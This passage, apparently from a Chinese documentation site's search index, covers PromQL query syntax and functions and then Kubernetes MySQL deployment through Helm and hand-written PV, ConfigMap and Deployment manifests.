\u975e\u6cd5\u8868\u8fbe\u5f0f\n  {job=~\".*\"}\n\n# \u5408\u6cd5\u8868\u8fbe\u5f0f\n  {job=~\".+\"}\n  {job=~\".*\",method=\"get\"}\n\n# \u6709\u6548\u662f\u56e0\u4e3a\u5b83\u4eec\u90fd\u6709\u4e00\u4e2a\u4e0e\u7a7a\u6807\u7b7e\u503c\u4e0d\u5339\u914d\u7684\u9009\u62e9\u5668\n\u590d\u5236\u4ee3\u7801\n</code></pre>"},{"location":"kubernetes/20-promql/#22","title":"2.2 \u8303\u56f4\u77e2\u91cf\u9009\u62e9\u5668","text":"<p>\u6301\u7eed\u65f6\u95f4\u4ec5\u9650\u4e8e\u6570\u5b57</p> <pre><code>s - seconds\nm - minutes\nh - hours\nd - days\nw - weeks\ny - years\n\u590d\u5236\u4ee3\u7801\n</code></pre> <pre><code># \u9009\u62e9\u5728\u8fc7\u53bb5\u5206\u949f\u5185\u4e3a\u5ea6\u91cf\u6807\u51c6\u540d\u79f0\u4e3ahttp_requests_total\u4e14\u6807\u7b7e\u8bbe\u7f6e\u4e3ajob=prometheus\u7684\u6240\u6709\u65f6\u95f4\u5e8f\u5217\u8bb0\u5f55\u7684\u6240\u6709\u503c\nhttp_requests_total{job=\"prometheus\"}[5m]\n\u590d\u5236\u4ee3\u7801\n</code></pre>"},{"location":"kubernetes/20-promql/#23","title":"2.3 \u504f\u79fb\u91cf\u4fee\u6539\u5668","text":"<p>\u504f\u79fb\u4fee\u6539\u5668\u5141\u8bb8\u66f4\u6539\u67e5\u8be2\u4e2d\u5404\u4e2a\u5373\u65f6\u548c\u8303\u56f4\u5411\u91cf\u7684\u65f6\u95f4\u504f\u79fb</p> <p>\u4f8b\u5982\uff1a\u4ee5\u4e0b\u8868\u8fbe\u5f0f\u76f8\u5bf9\u4e8e\u5f53\u524d\u67e5\u8be25\u5206\u949f\u524d\u7684http_requests_total\u503c</p> <pre><code>http_requests_total offset 5m\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u504f\u79fb\u4fee\u6539\u5668\u9700\u8981\u7acb\u5373\u8ddf\u968f\u9009\u62e9\u5668</p> <pre><code># \u975e\u6cd5\u8868\u8fbe\u5f0f\nsum(http_requests_total{method=\"GET\"}) offset 5m \n\n# \u5408\u6cd5\u8868\u8fbe\u5f0f\nsum(http_requests_total{method=\"GET\"} offset 5m)\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u540c\u6837\u9002\u7528\u4e8e\u8303\u56f4\u5411\u91cf</p> <pre><code># \u5c06\u8fd4\u56dehttp_requests_total\u4e00\u5468\u524d\u76845\u5206\u949f\u589e\u957f\u7387\nrate(http_requests_total[5m] offset 1w)\n\u590d\u5236\u4ee3\u7801\n</code></pre>"},{"location":"kubernetes/20-promql/#_3","title":"\u4e09\u3001\u4e8c\u5143\u8fd0\u7b97\u7b26","text":"<p>Prometheus\u4e2d\u5b58\u5728\u4ee5\u4e0b\u4e8c\u8fdb\u5236\u7b97\u672f\u8fd0\u7b97\u7b26</p>"},{"location":"kubernetes/20-promql/#31","title":"3.1 \u7b97\u672f\u4e8c\u5143\u8fd0\u7b97\u7b26","text":"<pre><code>+ (addition)\n- (subtraction)\n* (multiplication)\n/ (division)\n% (modulo)\n^ (power/exponentiation)\n\u590d\u5236\u4ee3\u7801\n</code></pre>"},{"location":"kubernetes/20-promql/#32","title":"3.2 \u6bd4\u8f83\u4e8c\u5143\u8fd0\u7b97\u7b26","text":"<pre><code>== (equal)\n!= (not-equal)\n&gt; (greater-than)\n&lt; (less-than)\n&gt;= (greater-or-equal)\n&lt;= (less-or-equal)\n\u590d\u5236\u4ee3\u7801\n</code></pre>"},{"location":"kubernetes/20-promql/#34","title":"3.4 \u903b\u8f91/\u96c6\u4e8c\u8fdb\u5236\u8fd0\u7b97\u7b26","text":"<pre><code>and (intersection)\nor (union)\nunless (complement)\n\u590d\u5236\u4ee3\u7801\n</code></pre>"},{"location":"kubernetes/20-promql/#35","title":"3.5 \u805a\u5408\u8fd0\u7b97\u7b26","text":"<p>Prometheus\u652f\u6301\u4ee5\u4e0b\u5185\u7f6e\u805a\u5408\u8fd0\u7b97\u7b26\uff0c\u8fd9\u4e9b\u8fd0\u7b97\u7b26\u53ef\u7528\u4e8e\u805a\u5408\u5355\u4e2a\u5373\u65f6\u5411\u91cf\u7684\u5143\u7d20\uff0c\u4ece\u800c\u751f\u6210\u5177\u6709\u805a\u5408\u503c\u7684\u8f83\u5c11\u5143\u7d20\u7684\u65b0\u5411\u91cf</p> <pre><code>sum (calculate sum over dimensions)                               # \u8303\u56f4\u5185\u6c42\u548c\nmin (select minimum over dimensions)                              # \u8303\u56f4\u5185\u6c42\u6700\u5c0f\u503c\nmax (select maximum over dimensions)                              # \u8303\u56f4\u5185\u6c42\u6700\u5927\u503c\navg (calculate the average over dimensions)                       # \u8303\u56f4\u5185\u6c42\u6700\u5927\u503c\nstddev (calculate population standard deviation over dimensions)  # \u8ba1\u7b97\u6807\u51c6\u504f\u5dee\nstdvar (calculate population standard variance over dimensions)   # \u8ba1\u7b97\u6807\u51c6\u65b9\u5dee\ncount (count number of elements in the vector)                    # \u8ba1\u7b97\u5411\u91cf\u4e2d\u7684\u5143\u7d20\u6570\u91cf\ncount_values (count number of elements with the same value)       # \u8ba1\u7b97\u5411\u91cf\u4e2d\u76f8\u540c\u5143\u7d20\u7684\u6570\u91cf\nbottomk (smallest k elements by sample value)                     # \u6837\u672c\u4e2d\u6700\u5c0f\u7684\u5143\u7d20\u503c\ntopk (largest k elements by sample value)                         # \u6837\u672c\u4e2d\u6700\u5927\u7684\u5143\u7d20\u503c\nquantile (calculate \u03c6-quantile (0 \u2264 \u03c6 \u2264 1) over dimensions)      # \u8ba1\u7b97 0-1 \u4e4b\u95f4\u7684\u767e\u5206\u6bd4\u6570\u91cf\u7684\u6837\u672c\u7684\u6700\u5927\u503c\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u8fd9\u4e9b\u8fd0\u7b97\u7b26\u53ef\u4ee5\u7528\u4e8e\u805a\u5408\u6240\u6709\u6807\u7b7e\u7ef4\u5ea6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5305\u542bwithout\u6216by\u5b50\u53e5\u6765\u4fdd\u7559\u4e0d\u540c\u7684\u7ef4\u5ea6</p> <pre><code>&lt;aggr-op&gt;([parameter,] &lt;vector expression&gt;) [without|by (&lt;label list&gt;)]\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u89e3\u6790</p> <pre><code>- parameter\u4ec5\u7528\u4e8ecount_values\uff0cquantile\uff0ctopk\u548cbottomk\n- without\u4ece\u7ed3\u679c\u5411\u91cf\u4e2d\u5220\u9664\u5217\u51fa\u7684\u6807\u7b7e\uff0c\u800c\u6240\u6709\u5176\u4ed6\u6807\u7b7e\u90fd\u4fdd\u7559\u8f93\u51fa\n- by\u76f8\u53cd\u5e76\u5220\u9664\u672a\u5728by\u5b50\u53e5\u4e2d\u5217\u51fa\u7684\u6807\u7b7e\uff0c\u5373\u4f7f\u5b83\u4eec\u7684\u6807\u7b7e\u503c\u5728\u5411\u91cf\u7684\u6240\u6709\u5143\u7d20\u4e4b\u95f4\u662f\u76f8\u540c\u7684\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u5982\u679chttp_requests_total\u5177\u6709\u6309application\uff0cinstance\u548cgroup\u6807\u7b7e\u5217\u51fa\u7684\u65f6\u95f4\u5e8f\u5217\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f</p> <pre><code># \u8ba1\u7b97\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u548c\u7ec4\u5728\u6240\u6709\u5b9e\u4f8b\u4e0a\u770b\u5230\u7684HTTP\u8bf7\u6c42\u603b\u6570\nsum(http_requests_total) without (instance)\n# \u7b49\u540c\u4e8e\nsum(http_requests_total) by (application, group)\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u53ea\u5bf9\u6211\u4eec\u5728\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u4e2d\u770b\u5230\u7684HTTP\u8bf7\u6c42\u603b\u6570\u611f\u5174\u8da3,\u53ef\u4ee5\u5199\u6210</p> <pre><code>sum(http_requests_total)\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u8981\u8ba1\u7b97\u8fd0\u884c\u6bcf\u4e2a\u6784\u5efa\u7248\u672c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6570\u91cf\uff0c\u53ef\u4ee5\u5199\u6210</p> <pre><code>count_values(\"version\", build_version)\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u8981\u5728\u6240\u6709\u5b9e\u4f8b\u4e2d\u83b7\u53d65\u4e2a\u6700\u5927\u7684HTTP\u8bf7\u6c42\u8ba1\u6570\uff0c\u53ef\u4ee5\u5199\u6210</p> <pre><code>topk(5, http_requests_total)\n\u590d\u5236\u4ee3\u7801\n</code></pre>"},{"location":"kubernetes/20-promql/#_4","title":"\u56db\u3001\u77e2\u91cf\u5339\u914d","text":""},{"location":"kubernetes/20-promql/#41","title":"4.1 \u4e00\u5bf9\u4e00\u77e2\u91cf\u5339\u914d","text":"<p>\u4e00\u5bf9\u4e00\u4ece\u64cd\u4f5c\u7684\u6bcf\u4e00\u4fa7\u627e\u5230\u552f\u4e00\u7684\u6761\u76ee\u5bf9\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd9\u662f\u683c\u5f0f\u4e3avector1  vector2\u4e4b\u540e\u7684\u64cd\u4f5c\u3002\u5982\u679c\u4e24\u4e2a\u6761\u76ee\u5177\u6709\u5b8c\u5168\u76f8\u540c\u7684\u6807\u7b7e\u96c6\u548c\u76f8\u5e94\u7684\u503c\uff0c\u5219\u5b83\u4eec\u5339\u914d\u3002</p> <p>ignore\u5173\u952e\u5b57\u5141\u8bb8\u5728\u5339\u914d\u65f6\u5ffd\u7565\u67d0\u4e9b\u6807\u7b7e\uff0c\u800con\u5173\u952e\u5b57\u5141\u8bb8\u5c06\u6240\u8003\u8651\u7684\u6807\u7b7e\u96c6\u51cf\u5c11\u5230\u63d0\u4f9b\u7684\u5217\u8868</p> <pre><code>&lt;vector expr&gt; &lt;bin-op&gt; ignoring(&lt;label list&gt;) &lt;vector expr&gt;\n&lt;vector expr&gt; &lt;bin-op&gt; on(&lt;label list&gt;) &lt;vector expr&gt;\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u8f93\u51fa\u793a\u4f8b</p> <pre><code>method_code:http_errors:rate5m{method=\"get\", code=\"500\"} 24\nmethod_code:http_errors:rate5m{method=\"get\", code=\"404\"} 30\nmethod_code:http_errors:rate5m{method=\"put\", code=\"501\"} 3\nmethod_code:http_errors:rate5m{method=\"post\", code=\"500\"} 6\nmethod_code:http_errors:rate5m{method=\"post\", code=\"404\"} 21\n\nmethod:http_requests:rate5m{method=\"get\"} 600\nmethod:http_requests:rate5m{method=\"del\"} 34\nmethod:http_requests:rate5m{method=\"post\"} 120\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u67e5\u8be2\u793a\u4f8b</p> <pre><code>method_code:http_errors:rate5m{code=\"500\"} / ignoring(code) method:http_requests:rate5m\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u8fd9\u5c06\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\u5411\u91cf\uff0c\u5176\u4e2d\u5305\u542b\u6bcf\u4e2a\u65b9\u6cd5\u7684\u72b6\u6001\u4ee3\u7801\u4e3a500\u7684HTTP\u8bf7\u6c42\u90e8\u5206\uff0c\u5728\u8fc7\u53bb5\u5206\u949f\u5185\u6d4b\u91cf\u3002\u5728\u4e0d\u5ffd\u7565\uff08\u4ee3\u7801\uff09\u7684\u60c5\u51b5\u4e0b\uff0c\u7531\u4e8e\u5ea6\u91cf\u6807\u51c6\u4e0d\u5171\u4eab\u540c\u4e00\u7ec4\u6807\u7b7e\uff0c\u56e0\u6b64\u4e0d\u4f1a\u5339\u914d</p> <p>\u65b9\u6cd5put\u548cdel\u7684\u6761\u76ee\u6ca1\u6709\u5339\u914d\uff0c\u5e76\u4e14\u4e0d\u4f1a\u663e\u793a\u5728\u7ed3\u679c\u4e2d</p> <pre><code>{method=\"get\"} 0.04 // 24 / 600\n{method=\"post\"} 0.05 // 6 / 120\n\u590d\u5236\u4ee3\u7801\n</code></pre>"},{"location":"kubernetes/20-promql/#42","title":"4.2 \u591a\u5bf9\u4e00\u4e0e\u4e00\u5bf9\u591a\u77e2\u91cf\u5339\u914d","text":"<p>\u591a\u5bf9\u4e00\u548c\u4e00\u5bf9\u591a\u5339\u914d\u6307\u7684\u662f\"\u4e00\"\u4fa7\u7684\u6bcf\u4e2a\u5411\u91cf\u5143\u7d20\u53ef\u4ee5\u4e0e\"\u591a\"\u4fa7\u7684\u591a\u4e2a\u5143\u7d20\u5339\u914d\u7684\u60c5\u51b5</p> <p>\u5fc5\u987b\u4f7f\u7528group_left\u6216group_right\u4fee\u9970\u7b26\u660e\u786e\u8bf7\u6c42\uff0c\u5176\u4e2dleft/right\u786e\u5b9a\u54ea\u4e2a\u5411\u91cf\u5177\u6709\u66f4\u9ad8\u7684\u57fa\u6570\u3002</p> <pre><code>&lt;vector expr&gt; &lt;bin-op&gt; ignoring(&lt;label list&gt;) group_left(&lt;label list&gt;) &lt;vector expr&gt;\n&lt;vector expr&gt; &lt;bin-op&gt; ignoring(&lt;label list&gt;) group_right(&lt;label list&gt;) &lt;vector expr&gt;\n&lt;vector expr&gt; &lt;bin-op&gt; on(&lt;label list&gt;) group_left(&lt;label list&gt;) &lt;vector expr&gt;\n&lt;vector expr&gt; &lt;bin-op&gt; on(&lt;label list&gt;) group_right(&lt;label list&gt;) &lt;vector expr&gt;\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u67e5\u8be2\u793a\u4f8b</p> <pre><code># \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5de6\u5411\u91cf\u6bcf\u4e2a\u65b9\u6cd5\u6807\u7b7e\u503c\u5305\u542b\u591a\u4e2a\u6761\u76ee\nmethod_code:http_errors:rate5m / ignoring(code) group_left method:http_requests:rate5m\n\n# \u56e0\u6b64\uff0c\u6211\u4eec\u4f7f\u7528group_left\u8868\u660e\u8fd9\u4e00\u70b9\n# \u53f3\u4fa7\u7684\u5143\u7d20\u73b0\u5728\u4e0e\u591a\u4e2a\u5143\u7d20\u5339\u914d\uff0c\u5de6\u4fa7\u5177\u6709\u76f8\u540c\u7684\u65b9\u6cd5\u6807\u7b7e\n{method=\"get\", code=\"500\"} 0.04 // 24 / 600\n{method=\"get\", code=\"404\"} 0.05 // 30 / 600\n{method=\"post\", code=\"500\"} 0.05 // 6 / 120\n{method=\"post\", code=\"404\"} 0.175 // 21 / 120\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u591a\u5bf9\u4e00\u548c\u4e00\u5bf9\u591a\u5339\u914d\u662f\u9ad8\u7ea7\u7528\u4f8b\uff0c\u4f7f\u7528\u524d\u8bf7\u4ed4\u7ec6\u8ba4\u771f\u601d\u8003</p>"},{"location":"kubernetes/20-promql/#_5","title":"\u4e94\u3001\u7bc7\u5916","text":"<pre><code>abs(v instant-vector)     # \u8fd4\u56de\u5176\u7edd\u5bf9\u503c\nabsent()                  # \u5982\u679c\u4f20\u9012\u7ed9\u5b83\u7684\u5411\u91cf\u5177\u6709\u8be5\u5143\u7d20\uff0c\u5219\u8fd4\u56de\u7a7a\u5411\u91cf;\u5982\u679c\u4f20\u9012\u7ed9\u5b83\u7684\u5411\u91cf\u6ca1\u6709\u5143\u7d20\uff0c\u5219\u8fd4\u56de\u4f20\u5165\u7684\u5143\u7d20\u3002\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u67e5\u8be2</p> <pre><code>nginx_server_connections\nnginx_server_connections{endpoint=\"metrics\",instance=\"192.168.43.5:9913\",job=\"nginx-vts\",namespace=\"dev\",pod=\"nginx-vts-9fcd4d45b-sdqds\",service=\"nginx-vts\",status=\"accepted\"} 89061\nnginx_server_connections{endpoint=\"metrics\",instance=\"192.168.43.5:9913\",job=\"nginx-vts\",namespace=\"dev\",pod=\"nginx-vts-9fcd4d45b-sdqds\",service=\"nginx-vts\",status=\"handled\"} 2\n\nabsent(nginx_server_connections{job=\"nginx-vts\"}) =&gt; {}\nabsent(nginx_server_connections{job=\"nginx-vts123\"}) =&gt; {job=\"nginx-vts123\"}\n\u590d\u5236\u4ee3\u7801\n</code></pre> <p>\u8fd0\u7b97\u7b26\uff08\u4ec5\u4f9b\u53c2\u8003\uff09</p> <pre><code>ceil(v instant-vector)                              # \u8fd4\u56de\u5411\u91cf\u4e2d\u6240\u6709\u6837\u672c\u503c(\u5411\u4e0a\u53d6\u6574\u6570)\nround(v instant-vector, to_nearest=1 scalar)        # \u8fd4\u56de\u5411\u91cf\u4e2d\u6240\u6709\u6837\u672c\u503c\u7684\u6700\u63a5\u8fd1\u7684\u6574\u6570,to_nearest\u662f\u53ef\u9009\u7684,\u9ed8\u8ba4\u4e3a1,\u8868\u793a\u6837\u672c\u8fd4\u56de\u7684\u662f\u6700\u63a5\u8fd11\u7684\u6574\u6570\u500d\u7684\u503c, \u53ef\u4ee5\u6307\u5b9a\u4efb\u610f\u7684\u503c(\u4e5f\u53ef\u4ee5\u662f\u5c0f\u6570),\u8868\u793a\u6837\u672c\u8fd4\u56de\u7684\u662f\u6700\u63a5\u8fd1\u5b83\u7684\u6574\u6570\u500d\u7684\u503c\nfloor(v instant-vector)                             # \u8fd4\u56de\u5411\u91cf\u4e2d\u6240\u6709\u6837\u672c\u503c(\u5411\u4e0b\u53d6\u6574\u6570)\nchanges(v range-vector)                             # \u5bf9\u4e8e\u6bcf\u4e2a\u8f93\u5165\u65f6\u95f4\u5e8f\u5217\uff0c\u8fd4\u56de\u5176\u5728\u65f6\u95f4\u8303\u56f4\u5185\uff08v range-vector\uff09\u66f4\u6539\u7684\u6b21\u6570\nclamp_max(v instant-vector, max scalar)             # \u9650\u5236v\u4e2d\u6240\u6709\u5143\u7d20\u7684\u6837\u672c\u503c\uff0c\u4f7f\u5176\u4e0a\u9650\u4e3amax\nclamp_min(v instant-vector, min scalar)             # \u9650\u5236v\u4e2d\u6240\u6709\u5143\u7d20\u7684\u6837\u672c\u503c\uff0c\u4f7f\u5176\u4e0b\u9650\u4e3amin\nyear(v=vector(time()) instant-vector)               # \u8fd4\u56deUTC\u4e2d\u7ed9\u5b9a\u65f6\u95f4\u7684\u5e74\u4efd\nday_of_month(v=vector(time()) instant-vector)       # \u8fd4\u56deUTC\u4e2d\u7ed9\u5b9a\u65f6\u95f4\u7684\u6708\u4e2d\u7684\u67d0\u4e00\u5929\uff0c\u8fd4\u56de\u503c\u4e3a1\u523031\nday_of_week(v=vector(time()) instant-vector)        # \u8fd4\u56deUTC\u4e2d\u7ed9\u5b9a\u65f6\u95f4\u7684\u5f53\u5468\u4e2d\u7684\u67d0\u4e00\u5929\uff0c\u8fd4\u56de\u503c\u4e3a0\u52306\ndays_in_month(v=vector(time()) instant-vector)      # \u8fd4\u56deUTC\u4e2d\u7ed9\u5b9a\u65f6\u95f4\u7684\u4e00\u4e2a\u6708\u7684\u5929\u6570\uff0c\u8fd4\u56de\u503c28\u523031\nhour(v=vector(time()) instant-vector)               # \u8fd4\u56deUTC\u4e2d\u7ed9\u5b9a\u65f6\u95f4\u7684\u5f53\u5929\u4e2d\u7684\u67d0\u4e00\u5c0f\u65f6\uff0c\u8fd4\u56de\u503c\u4e3a0\u523023\nminute(v=vector(time()) instant-vector)             # \u8fd4\u56deUTC\u4e2d\u7ed9\u5b9a\u65f6\u95f4\u7684\u5c0f\u65f6\u4e2d\u7684\u67d0\u5206\u949f\uff0c\u8fd4\u56de\u503c\u4e3a0\u523059\ndelta(v range-vector)                               # \u8fd4\u56de\u4e00\u4e2a\u5373\u65f6\u5411\u91cf\uff0c\u5b83\u8ba1\u7b97\u6bcf\u4e2atime series\u4e2d\u7684\u7b2c\u4e00\u4e2a\u503c\u548c\u6700\u540e\u4e00\u4e2a\u503c\u7684\u5dee\u522b\nderiv(v range-vector)                               # \u8ba1\u7b97\u6bcf\u4e2atime series\u7684\u6bcf\u79d2\u7684\u5bfc\u6570(derivative)\nexp(v instant-vector)                               # \u8ba1\u7b97v\u4e2d\u6240\u6709\u5143\u7d20\u7684\u6307\u6570\u51fd\u6570\nhistogram_quantile(\u03c6 float, b instant-vector)       # \u4ecebuckets\u7c7b\u578b\u7684\u5411\u91cf\u4e2d\u8ba1\u7b97\u03c6(0 \u2264 \u03c6 \u2264 1)\u767e\u5206\u6bd4\u7684\u6837\u672c\u7684\u6700\u5927\u503c\nholt_winters(v range-vector, sf scalar, tf scalar)  # \u6839\u636e\u8303\u56f4\u5411\u91cf\u4e2d\u7684\u8303\u56f4\u4ea7\u751f\u4e00\u4e2a\u5e73\u6ed1\u7684\u503c\nidelta(v range-vector)                              # \u8ba1\u7b97\u6700\u65b0\u76842\u4e2a\u6837\u672c\u503c\u4e4b\u95f4\u7684\u5dee\u522b\nincrease(v range-vector)                            # \u8ba1\u7b97\u6307\u5b9a\u8303\u56f4\u5185\u7684\u589e\u957f\u503c, \u5b83\u4f1a\u5728\u5355\u8c03\u6027\u53d1\u751f\u53d8\u5316\u65f6(\u5982\u7531\u4e8e\u76ee\u6807\u91cd\u542f\u5f15\u8d77\u7684\u8ba1\u6570\u5668\u590d\u4f4d)\u81ea\u52a8\u4e2d\u65ad\nirate(v range-vector)                               # \u8ba1\u7b97\u6bcf\u79d2\u7684\u5e73\u5747\u589e\u957f\u503c, \u57fa\u4e8e\u7684\u662f\u6700\u65b0\u76842\u4e2a\u6570\u636e\u70b9\nrate(v range-vector)                                # \u8ba1\u7b97\u6bcf\u79d2\u7684\u5e73\u5747\u589e\u957f\u503c\nresets(v range-vector)                              # \u5bf9\u4e8e\u6bcf\u4e2a time series , \u5b83\u90fd\u8fd4\u56de\u4e00\u4e2a counter resets\u7684\u6b21\u6570\nsort(v instant-vector)                              # \u5bf9\u5411\u91cf\u6309\u5143\u7d20\u7684\u503c\u8fdb\u884c\u5347\u5e8f\u6392\u5e8f\nsort_desc(v instant-vector)                         # \u5bf9\u5411\u91cf\u6309\u5143\u7d20\u7684\u503c\u8fdb\u884c\u964d\u5e8f\u6392\u5e8f\nsqrt(v instant-vector)                              # \u8fd4\u56dev\u4e2d\u6240\u6709\u5411\u91cf\u7684\u5e73\u65b9\u6839\ntime()                                              # \u8fd4\u56de\u4ece1970-1-1\u8d77\u81f3\u4eca\u7684\u79d2\u6570,UTC\u65f6\u95f4\n</code></pre>"},{"location":"kubernetes/21-mysql/","title":"Helm + MySQL","text":""},{"location":"kubernetes/21-mysql/#helm","title":"\u4e00\u3001Helm","text":""},{"location":"kubernetes/21-mysql/#11-install","title":"1.1 Install","text":"<pre><code># mysql\nhelm repo add bitnami https://charts.bitnami.com/bitnami\nhelm repo update bitnami\nhelm search repo mysql\n\nhelm show values bitnami/mysql --version 8.9.2 &gt; mysql.yaml-8.9.2-default\n\n# - mysql-standalone.yaml\nhelm install mysql-standalone bitnami/mysql \\\n    -f mysql-standalone.yaml-8.9.2 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 8.9.2 --debug\n\nhelm upgrade --install mysql-standalone bitnami/mysql \\\n    -f mysql-standalone.yaml-8.9.2 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 8.9.2 --debug    \n\nhelm -n kube-server uninstall mysql-standalone\n\n# - mysql-replication.yaml\nhelm install mysql-replication bitnami/mysql \\\n    -f mysql-replication.yaml-8.9.2 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 8.9.2 --debug\n\nhelm upgrade --install mysql-replication bitnami/mysql \\\n    -f mysql-replication.yaml-8.9.2 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 8.9.2 --debug \n\nhelm -n kube-server uninstall mysql-replication\n</code></pre>"},{"location":"kubernetes/21-mysql/#12-usage","title":"1.2 Usage","text":"<pre><code>kubectl -n kube-server exec -it pod/mysql-replication-primary-0 sh\nmysql -uroot -pjesse\n\nmysql -h10.101.11.182 -P30380 -ugrafana -pgrafana\n\n# Prometheus\ncreate database prometheus_alert;\ncreate user 'prometheus_alert'@'%' identified by 'prometheus_alert';\ngrant all privileges on prometheus_alert.* to `prometheus_alert`@`%`;\nflush privileges;\n\n# JumpServer\ncreate database jumpserver;\ncreate user 'jumpserver'@'%' identified by 'jumpserver';\ngrant all privileges on jumpserver.* to `jumpserver`@`%`;\nflush privileges;\n</code></pre>"},{"location":"kubernetes/21-mysql/#_1","title":"\u4e8c\u3001\u624b\u52a8","text":"<p>\u5728kubernetes\u4e0b\u5c0f\u8bd5MySQL\u7684\u642d\u5efa</p> <p>\u5f53\u4e0b\u6700\u65b0\u7248\u672c</p> <ul> <li>5.7.37</li> <li>8.0.28</li> </ul> <p>\u642d\u5efa\u65b9\u5f0f\u4e00\u6837\uff0c\u8fd9\u91cc\u793a\u4f8b\u642d\u5efa5.7.37\u7248\u672c\u3002\u89c4\u5212\u5728kubernetes\u91cc\u9762\u642d\u5efamysql-5\u548cmysql-8\u63d0\u4f9b\u7ed9\u5176\u4ed6\u4f7f\u7528\u3002</p> <p></p>"},{"location":"kubernetes/21-mysql/#21","title":"2.1\u3001\u642d\u5efa","text":""},{"location":"kubernetes/21-mysql/#211-pvc","title":"2.1.1 PVC","text":"<p>\u5148\u521b\u5efa\u5b58\u50a8</p> <ul> <li>PersistentVolume\uff0c\u7b80\u79f0pv</li> <li>PersistentVolumeClaim\uff0c\u7b80\u79f0pvc</li> </ul> <p>\u9009\u62e9\u5176\u4e2d\u4e00\u53f0Node\u8282\u70b9\u672c\u5730\u5b58\u50a8\uff08\u6709\u5206\u5e03\u5f0f\u5b58\u50a8\u4f1a\u66f4\u65b9\u4fbf\u66f4\u53cb\u597d\uff09</p> <p>\u9700\u8981\u63d0\u524d\u5728\u76ee\u6807\u673a\u5668\u4e0a\u521b\u5efa\u76ee\u5f55<code>/opt/data/mysql-5</code></p> <pre><code>apiVersion: v1\nitems:\n- apiVersion: v1\n  kind: PersistentVolume\n  metadata:\n    annotations:\n      pv.kubernetes.io/bound-by-controller: \"yes\"\n    finalizers:\n    - kubernetes.io/pv-protection\n    labels:\n      pvname: pv-mysql-5\n    name: pv-mysql-5\n  spec:\n    accessModes:\n    - ReadWriteOnce\n    capacity:\n      storage: 20Gi\n    local:\n      path: /opt/data/mysql-5\n    nodeAffinity:\n      required:\n        nodeSelectorTerms:\n        - matchExpressions:\n          - key: kubernetes.io/hostname\n            operator: In\n            values:\n            - k-kube-lab-09\n    persistentVolumeReclaimPolicy: Retain\n    storageClassName: mysql-5\n    volumeMode: Filesystem\n- apiVersion: v1\n  kind: PersistentVolumeClaim\n  metadata:\n    annotations:\n      pv.kubernetes.io/bind-completed: \"yes\"\n      pv.kubernetes.io/bound-by-controller: \"yes\"\n    finalizers:\n    - kubernetes.io/pvc-protection\n    labels:\n      addonmanager.kubernetes.io/mode: EnsureExists\n      kubernetes.io/cluster-service: \"true\"\n    name: pvc-mysql-5\n    namespace: kube-server\n  spec:\n    accessModes:\n    - ReadWriteOnce\n    resources:\n      requests:\n        storage: 20Gi\n    storageClassName: mysql-5\n    volumeMode: Filesystem\n    volumeName: pv-mysql-5\n    type: NodePort\nkind: List    \n</code></pre>"},{"location":"kubernetes/21-mysql/#212-cm","title":"2.1.2 CM","text":"<p>\u914d\u7f6e\u7ba1\u7406</p> <ul> <li>configmap\uff0c\u7b80\u79f0cm</li> </ul> <pre><code>apiVersion: v1\ndata:\n  my.cnf: |\n    # For explanations see\n    # http://dev.mysql.com/doc/mysql/en/server-system-variables.html\n    [mysqld]\n    pid-file = /var/run/mysqld/mysqld.pid\n    socket   = /var/run/mysqld/mysqld.sock\n    datadir  = /var/lib/mysql\n    #log-error    = /var/log/mysql/error.log\n    #bind-address = 127.0.0.1\n    symbolic-links = 0\n    skip-host-cache\n    skip-name-resolve\n    [mysql]\n    [mysqldump]\n    quick\n    quote-names\n    max_allowed_packet = 16M\nkind: ConfigMap\nmetadata:\n  labels:\n    app: mysql-5\n    component: mysql\n    version: 5.7.37\n  name: mysql-5\n  namespace: kube-server\n</code></pre>"},{"location":"kubernetes/21-mysql/#213-po","title":"2.1.3 PO","text":"<p>\u521b\u5efa\u5bb9\u5668</p> <ul> <li>deployments\uff0c\u7b80\u79f0deploy</li> <li>pod\uff0c\u7b80\u79f0po</li> <li>service\uff0c\u7b80\u79f0svc</li> </ul> <pre><code>apiVersion: v1\nitems:\n- apiVersion: apps/v1\n  kind: Deployment\n  metadata:\n    labels:\n      k8s-app: mysql-5\n    name: mysql-5\n    namespace: kube-server\n  spec:\n    replicas: 1\n    revisionHistoryLimit: 5\n    selector:\n      matchLabels:\n        k8s-app: mysql-5\n    strategy:\n      rollingUpdate:\n        maxSurge: 25%\n        maxUnavailable: 25%\n      type: RollingUpdate\n    template:\n      metadata:\n        labels:\n          k8s-app: mysql-5\n      spec:\n        containers:\n        - env:\n          - name: MYSQL_ROOT_PASSWORD\n            value: jesse\n          image: hub.8ops.top/third/mysql:5.7.37\n          imagePullPolicy: IfNotPresent\n          name: mysql\n          ports:\n          - containerPort: 3306\n            protocol: TCP\n          resources:\n            limits:\n              cpu: 500m\n              memory: 512Mi\n            requests:\n              cpu: 200m\n              memory: 256Mi\n          volumeMounts:\n          - mountPath: /etc/mysql\n            name: mysql-config\n          - mountPath: /var/lib/mysql\n            name: mysql-data\n        dnsPolicy: 